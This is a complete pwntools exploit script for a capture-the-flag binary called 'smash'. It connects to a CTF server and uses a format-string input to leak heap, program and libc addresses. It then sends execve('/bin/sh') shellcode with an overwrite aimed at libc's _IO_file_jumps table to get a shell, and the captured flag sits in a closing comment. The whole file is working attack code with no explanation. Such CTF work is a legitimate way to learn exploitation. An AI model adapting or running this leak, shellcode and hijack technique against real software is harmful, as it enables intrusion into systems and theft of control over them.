from pwn import *


binpath = './smash'
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
b *0x555555555220
# after readline
b *0x555555555290
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(b'./run.sh')
io = remote('pwn01.chal.ctf.westerns.tokyo', 29246)

io.recvuntil(b'Input name > ')
io.sendline(b'%p' * 9)
data = io.recvline().rstrip().replace(b'(nil)', b'0x0')
vals = [int(d, 16) for d in data.split(b'0x') if len(d) > 0]

addr_heap = vals[4] - 0x6b0
addr_prog = vals[6] - 0x1216
addr_libc = vals[8] - 0x270b3

print('addr_heap = 0x{:x}'.format(addr_heap))
print('addr_prog = 0x{:x}'.format(addr_prog))
print('addr_libc = 0x{:x}'.format(addr_libc))


addr_finish = addr_libc + libc.symbols['_IO_file_jumps'] + 0x10
# addr_xsputn = addr_libc + libc.symbols['_IO_file_jumps'] + 0x38

payload = b''
payload += b"\xf3\x0f\x1e\xfa" # endbr64
payload += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload += b'\x90' * (0x30 - len(payload))
payload += p64(addr_finish + 0x8)

io.sendlineafter(b'OK? [y/n] ', payload)


io.interactive()

# TWCTF{17_15_ju57_4n_3mul470r,n07_r34l_CET}
